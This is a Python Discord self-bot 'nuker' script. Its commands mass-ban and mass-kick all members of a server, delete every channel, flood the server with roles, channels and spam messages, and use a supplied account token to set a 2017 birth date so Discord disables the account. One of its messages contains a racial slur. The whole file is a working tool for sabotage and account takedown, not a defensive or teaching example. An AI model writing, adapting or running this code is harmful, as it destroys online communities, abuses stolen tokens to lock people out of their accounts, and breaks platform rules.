import discord
import time
from discord.ext import commands
from colorama import Fore, init 
import requests
import os 
import base64
import random

prefix = "x"

TOP = commands.Bot(command_prefix=prefix, self_bot=True)
TOP.remove_command('help')

@TOP.event
async def on_connect():
    print(f'''{Fore.GREEN} ___   ___  ___  __    _________  ________  _______       ___    ___ 
|\  \ |\  \|\  \|\  \ |\___   ___\\   __  \|\  ___ \     |\  \  /  /|
\ \  \\_\  \ \  \/  /|\|___ \  \_\ \  \|\  \ \   __/|    \ \  \/  / /
 \ \______  \ \   ___  \   \ \  \ \ \   _  _\ \  \_|/__   \ \    / / 
  \|_____|\  \ \  \\ \  \   \ \  \ \ \  \\  \\ \  \_|\ \   \/  /  /  
         \ \__\ \__\\ \__\   \ \__\ \ \__\\ _\\ \_______\__/  / /    
          \|__|\|__| \|__|    \|__|  \|__|\|__|\|_______|\___/ /     
                                                        \|___|/      
                                                                     
                                                                      ''')
    print(f'''{Fore.RED}MADE BY SIRUS AND JANKY ''')

@TOP.command()
async def help(ctx):
    embed = discord.Embed(title="> **4KTREY NUKER💚**", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/728020275089899520/730809245490085938/20200709_113417.gif")
    embed.add_field(name="`ban💚`", value="**Mass-bans everyone below your role.**\n", inline=False)
    embed.add_field(name="`kick💚`", value="**Mass-kicks everyone below your role.**\n", inline=False)
    embed.add_field(name="`roles💚`", value="**Mass-creates roles.**\n", inline=False)  
    embed.add_field(name="`channels💚`", value="**Mass-creates channels.**\n", inline=False)
    embed.add_field(name="`dash💚`", value="**Mass-deletes channels.**\n", inline=False)
    embed.add_field(name="`purge💚`", value="**Mass-deletes messages.**\n", inline=False)
    embed.add_field(name="`spam💚`", value="**Mass-sends messages.**\n", inline=False)
    embed.add_field(name="`tokenban`", value="***disable💚*** **Token required.**\n", inline=False)
    embed.add_field(name="> **ON RICH SHIT**", value="**Your demise is near.**\n", inline=False)
    embed.set_footer(text=f"Logged in as : {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://cdn.discordapp.com/attachments/731886846514036748/734079941112758352/20200707_024631.gif")
    await ctx.send(embed=embed)

@TOP.command()
async def ban(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@TOP.command()
async def kick(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass   

@TOP.command()
async def roles(ctx):
    for _i in range(900):
        try:
            await ctx.guild.create_role(name=WIZZ(), color=PINK())
        except:
            return    

@TOP.command()
async def channels(ctx):
    for _i in range(900):
        try:
            await ctx.guild.create_text_channel(name=WIZZ())
        except:
            return

@TOP.command()
async def dash(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@TOP.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@TOP.command()
async def purge(ctx, amount: int):  # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == TOP.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass


def WIZZ():
    return "Treesh is 4ktrey💚💚"
@TOP.command()
async def disable(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2017-7-16'})
    if r.status_code == 400:
       await ctx.send(f"`Account disabled. pussy ah nigga`")
       print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
    else:
       await ctx.send(f"`Invalid token kuhh`")
       
def PINK(): 
    PINK = discord.Color(random.randint(0xFF00CB, 0xFF00CB))
    return PINK

TOP.run('Token here', bot=False)
